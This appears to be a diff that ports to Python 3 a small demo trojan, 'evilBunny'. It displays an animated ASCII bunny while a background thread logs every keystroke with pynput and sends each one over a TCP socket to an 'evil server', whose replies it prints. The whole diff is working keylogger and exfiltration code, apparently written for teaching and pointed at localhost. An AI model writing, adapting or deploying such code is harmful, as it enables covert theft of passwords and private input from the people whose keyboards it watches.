@@ -1,122 +1,134 @@
 
-import keylogger
+from pynput import keyboard
+import sys
 import time
 import socket
-from thread import *
+import threading
 
 ############################################################################
 
-evilBunnyServerIP   = "127.0.0.1"
+evilBunnyServerIP = "127.0.0.1"
 evilBunnyServerPort = 8912
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 ############################################################################
 
-def main() :
-   
-    # Start a thread that displays an animated ascii bunny
-    start_new_thread(animatedBunny, ())
-    
+
+def start_new_thread(f, args):
+
+    t = threading.Thread(target=f, args=args)
+    t.start()
+    return t
+
+
+def main():
+
+    global sock
+
     # Establish TCP socket with the distant server
-    try :
-        sock.connect(( evilBunnyServerIP, evilBunnyServerPort ))
-    
-    except :
-    
-        print "Something wrong happened. Failed to connect to evil server ?"
+    try:
+        sock.connect((evilBunnyServerIP, evilBunnyServerPort))
 
-        exit()
+    except Exception:
 
-    start_new_thread(serverHandler, ())
+        print("Something wrong happened. Failed to connect to evil server? You should launch evilBunnyServer in another terminal first!")
+        sys.exit(1)
+
+    t1 = start_new_thread(animatedBunny, ())
+    t2 = start_new_thread(keylog, ())
+    t3 = start_new_thread(printMessagesFromEvilServer, ())
 
     # Send a hello message
-    sock.send("Hello evil server !")
+    sock.send(b"Hello evil server !")
 
     # Infinite loop so that the program and thread keeps running
-    while True :
-        pass
-
+    while True:
+        if any(not t.is_alive() for t in [t1, t2, t3]):
+            sock = None
+            sys.exit(0)
 
 
 ############################################################################
 
 # Thread launched after connection with the evil server is started
-# -> it launces the keylogger 
-#    + another function which prints what the server sends
-def serverHandler():
- 
-    # Start key logger
-    now = time.time()
-    done = lambda: time.time() > now + 60
-    keylogger.log(done, sendKeysToEvilServer)
+# -> it launces the keylogger
+def keylog():
 
-    # Print what we receive from the server
-    printMessagesFromEvilServer()
+    def on_press(key):
 
-############################################################################
-   
-# Function which is called every time the user presses a key on its computer
-def sendKeysToEvilServer(t, modifiers, keys) :
-    
-    activeMods = ""
-    for mod in modifiers :
-        if (modifiers[mod] == True) :
-            activeMods += "+"+mod+" "
+        if sock is None:
+            sys.exit(0)
 
-    if (activeMods != "") :
-        activeMods = "("+activeMods+")"
+        try:
+            sock.send(bytes(str(key).encode('utf-8')))
+        except Exception as e:
+            sys.exit(1)
 
-    sock.send(str(t)+" "+str(keys)+" "+str(activeMods))
-
-# Function that prints what the server sends
-def printMessagesFromEvilServer() :
-    
-    while True:
-         
-        data = sock.recv(1024)
-        print "[Server] "+data
+    # Collect events until released
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
 ############################################################################
 
-def animatedBunny() :
+
+def printMessagesFromEvilServer():
 
     while True:
+        if sock is None:
+            sys.exit(0)
 
-        for i in range(80) :
-            print " "
-            
-        print """
+        data = sock.recv(1024).decode('utf-8')
+
+        if not data:
+            sys.exit(0)
+
+        print("[Server] " + data)
+
+############################################################################
+
+
+bunny1 = r"""
            \`\ /`/
-            \ V /               
-            /. .\       
-           =\ ~ /=                  
-            / ^ \     
-         {}/\\\\ //\\
-         __\ " " /__           
+            \ V /
+            /. .\
+           =\ ~ /=
+            / ^ \
+           /\\ //\
+         __\ " " /__
         (____/^\____)
         """
-       
-        time.sleep(1)
 
-        for i in range(80) :
-            print " "
-     
-        print """
+
+bunny2 = r"""
            \`\ /`/
-            \ V /               
-            /. .\       
-           =\ v /=                  
-            / ^ \     
-         {}/\\\\ //\\
+            \ V /
+            /. .\
+           =\ v /=
+            / ^ \
+           /\\ //\
            \ " " /
-           / / \\ \\
-          / /   \\ \\
+           / / \ \
+          / /   \ \
           `-     `-`
         """
 
+
+def animatedBunny():
+
+    while True:
+
+        if sock is None:
+            sys.exit(0)
+
+        print("\n" * 80 + bunny1)
+
+        time.sleep(1)
+
+        print("\n" * 80 + bunny2)
+
         time.sleep(1)
 
 ############################################################################
+
+
 main()
-
-
